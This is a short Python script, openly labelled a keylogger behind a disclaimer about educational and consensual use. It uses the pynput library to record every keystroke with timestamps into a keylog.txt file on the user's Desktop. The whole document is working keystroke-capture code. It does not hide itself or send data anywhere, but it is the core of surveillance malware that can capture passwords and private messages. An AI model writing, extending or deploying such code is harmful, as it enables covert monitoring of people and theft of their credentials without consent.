
"""
WARNING: This script is a keylogger. It is provided for educational and ethical purposes
(e.g., to monitor your own computer activity). Unauthorized use of this software to
log the keystrokes of others without their explicit consent is illegal and unethical.
Use this script responsibly and in compliance with all local laws and regulations.
"""
import pynput.keyboard
from pynput.keyboard import Key, Listener
import logging
import os 
log_directory = os.path.expanduser("~/Desktop/") 

log_file_path = os.path.join(log_directory, "keylog.txt")

logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
    
    
